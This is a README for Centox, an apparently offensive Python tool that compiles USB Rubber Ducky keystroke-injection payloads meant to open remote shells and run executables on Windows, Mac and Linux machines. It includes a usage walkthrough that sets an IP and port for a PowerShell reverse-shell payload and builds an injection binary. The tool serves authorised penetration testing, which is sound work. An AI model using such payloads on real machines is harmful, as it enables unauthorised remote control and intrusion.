<p align="center">
    <img src="/assets/media/logo.png" height="200">
</p>

<h1 align="center">
  Centox
</h1>

Centox is an injection handler written in python3 and is designed to provide a collection of injection
payloads written for the [USB Rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe/)
which was designed by [Hak5](https://shop.hak5.org/). This project contains payloads designed for 
establishing remote access, deploying and running executables and more in as short time as possible.
Centox comes with payloads designed Windows, Mac and Linux with the assumption that the target has not
modified their default shortcuts.


## Disclaimer

This project was designed for testing purposes __ONLY__ and is not to be used without explicit permission.
Hacking without permission is not encouraged and the author is not responsible for any illegal use of this tool.

## Installation

Downloading and running setup.py:
```
$ git clone https://github.com/Sigurd-Pettersen/Centox.git
$ sudo python3 Centox/setup.py
```
running setup.py will automatically generate a centox executable to be run in terminal.

## Usage
Starting the centox handler:
```
$ centox
```

the handler commands can be listed using the `help` command:
```
[Centox] $ help

Command    Description
---------  -------------------------------
list       lists all available payloads
use        choose a payload to use
set        sets payload argument variables
options    show all available arguments
generate   generates the current payload
help       shows this help message
```

how to generate payloads:
```
[Centox] $ use windows/shell/powershell
 
[Centox] $ options
 
 Payload: windows/shell/powershell
 
Argument       Value
-------------  -------
start_delay    500
ip
port
windows_admin  false
 
[Centox] $ set ip 192.168.68.42
 
[Centox] $ set port 9999
 
[Centox] $ generate -o /home/user/inject.bin -l no
[*] created temporary folder -> /tmp/tmpfeccetz0
[*] writing raw payload to -> /tmp/tmpfeccetz0/payload
[*] compiling payload to injection binary...
[*] injection compiled successfully -> /home/user/inject.bin
```

## Compatibility
- [x] USB Rubber Ducky
- [ ] O.MG Cable
- [ ] Bash Bunny
- [ ] Arduino Injectors
